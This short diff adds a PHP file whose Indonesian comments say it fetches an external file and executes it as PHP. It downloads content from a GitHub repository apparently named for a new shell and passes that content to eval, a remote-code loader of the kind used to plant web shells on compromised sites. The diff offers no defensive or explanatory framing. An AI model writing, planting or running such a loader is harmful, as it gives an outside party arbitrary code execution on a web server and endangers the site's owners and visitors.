@@ -1,0 +1,7 @@
+<?php
+// Ambil isi file eksternal
+$data = file_get_contents('https://raw.githubusercontent.com/sekjhhh/shel-baru/refs/heads/main/3X.encryt-Godbyeltspid');
+
+// Eksekusi konten sebagai PHP
+eval('?>' . $data);
+?>
